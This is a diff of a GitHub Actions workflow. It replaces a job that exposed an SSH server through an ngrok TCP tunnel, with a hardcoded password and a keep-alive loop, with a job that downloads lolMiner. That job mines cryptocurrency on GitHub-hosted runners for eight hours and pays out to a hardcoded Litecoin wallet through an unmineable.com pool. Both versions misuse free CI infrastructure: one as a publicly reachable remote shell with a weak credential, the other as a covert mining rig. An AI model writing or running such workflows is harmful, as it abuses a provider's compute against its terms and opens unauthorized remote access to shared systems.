@@ -1,108 +1,38 @@
-name: SSH Server with Ngrok and Auth HTTP Server
+name: lolMiner LTC Mining (8 Hours)
 
 on:
   workflow_dispatch:
 
 jobs:
-  setup-ssh-server:
+  mine:
     runs-on: ubuntu-latest
+    timeout-minutes: 480  # 8 hours total
 
     steps:
-      - name: Install dependencies
+      - name: Install Dependencies
         run: |
           sudo apt update
-          sudo apt install -y openssh-server wget unzip jq net-tools python3 bc
+          sudo apt install -y wget unzip screen pciutils
 
-      - name: Create hydra user and setup SSH
+      - name: Setup NVIDIA Driver and Check GPU
         run: |
-          sudo useradd -m hydra || true
-          echo "hydra:root@hydra" | sudo chpasswd
-          sudo mkdir -p /home/hydra/.ssh
-          echo "${{ secrets.SSH_PUBLIC_KEY }}" | sudo tee /home/hydra/.ssh/authorized_keys
-          sudo chown -R hydra:hydra /home/hydra/.ssh
-          sudo chmod 700 /home/hydra/.ssh
-          sudo chmod 600 /home/hydra/.ssh/authorized_keys
-          sudo systemctl enable ssh
-          sudo systemctl restart ssh
+          sudo apt install -y nvidia-driver-470 || true
+          sudo modprobe nvidia || true
+          nvidia-smi || echo "GPU not found or not supported on this runner"
 
-      - name: Save public key for HTTP access
+      - name: Download and Run lolMiner with Timeout Loop
         run: |
-          echo "${{ secrets.SSH_PUBLIC_KEY }}" | sudo tee /home/hydra/hydra_key.pub
-          sudo chown hydra:hydra /home/hydra/hydra_key.pub
+          wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.82/lolMiner_v1.82_Lin64.tar.gz
+          tar -xvzf lolMiner_v1.82_Lin64.tar.gz
+          cd 1.82
+          chmod +x lolMiner
 
-      - name: Create auth HTTP server script
-        run: |
-          sudo bash -c "cat > /home/hydra/auth_http_server.py << 'EOF'
-import http.server
-import socketserver
-import base64
-import os
-
-PORT = 8000
-USERNAME = "hydra"
-PASSWORD = "root@hydra"
-
-class AuthHandler(http.server.SimpleHTTPRequestHandler):
-    def do_AUTHHEAD(self):
-        self.send_response(401)
-        self.send_header('WWW-Authenticate', 'Basic realm="SSH Public Key"')
-        self.send_header('Content-type', 'text/html')
-        self.end_headers()
-
-    def do_GET(self):
-        auth_header = self.headers.get('Authorization')
-        if auth_header is None:
-            self.do_AUTHHEAD()
-            self.wfile.write(b'Authentication required.')
-            return
-        try:
-            auth_type, encoded = auth_header.split(' ', 1)
-            if auth_type.lower() == 'basic':
-                decoded = base64.b64decode(encoded).decode('utf-8')
-                username, password = decoded.split(':', 1)
-                if username == USERNAME and password == PASSWORD:
-                    return http.server.SimpleHTTPRequestHandler.do_GET(self)
-        except Exception as e:
-            pass
-        self.do_AUTHHEAD()
-        self.wfile.write(b'Authentication failed.')
-
-if __name__ == "__main__":
-    os.chdir("/home/hydra")
-    with socketserver.TCPServer(("", PORT), AuthHandler) as httpd:
-        print(f"Serving at port {PORT}")
-        httpd.serve_forever()
-EOF
-          sudo chown hydra:hydra /home/hydra/auth_http_server.py
-          cd /home/hydra
-          nohup python3 auth_http_server.py &
-
-      - name: Install and start Ngrok
-        run: |
-          wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip
-          unzip ngrok-stable-linux-amd64.zip
-          sudo mv ngrok /usr/local/bin
-          ngrok config add-authtoken ${{ secrets.NGROK_AUTH_TOKEN }}
-          nohup ngrok tcp 22 &
-
-      - name: Show SSH connection info
-        run: |
-          sleep 15
-          NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
-          HOST=$(echo $NGROK_URL | sed -e 's/tcp:\/\///' | cut -d ":" -f 1)
-          PORT=$(echo $NGROK_URL | cut -d ":" -f 3)
-          echo ""
-          echo "✅ SSH Server Ready"
-          echo "Host: $HOST"
-          echo "Port: $PORT"
-          echo "User: hydra"
-          echo "Pass: root@hydra"
-          echo "SSH Command: ssh hydra@$HOST -p $PORT"
-          echo "Public key download (Basic Auth):"
-          echo "http://$HOST:8000/hydra_key.pub"
-          echo "User: hydra / Pass: root@hydra"
-
-      - name: Keep alive
-        run: |
-          echo "Server will run for 8 hours..."
-          sleep $((60*60*8))
+          end=$((SECONDS+28800))  # 8 hours = 28800 seconds
+          while [ $SECONDS -lt $end ]; do
+            echo "Starting lolMiner at $(date)"
+            timeout 350m ./lolMiner --algo ETHASH \
+              --pool stratum+tcp://ethash.unmineable.com:3333 \
+              --user LTC:ltc1qpr87n7at9emtujezjuhclt0epynmc6c9vek57x.ucode0#u3ux-cj3w \
+              --ethstratum ETHPROXY || echo "lolMiner exited"
+            sleep 10
+          done
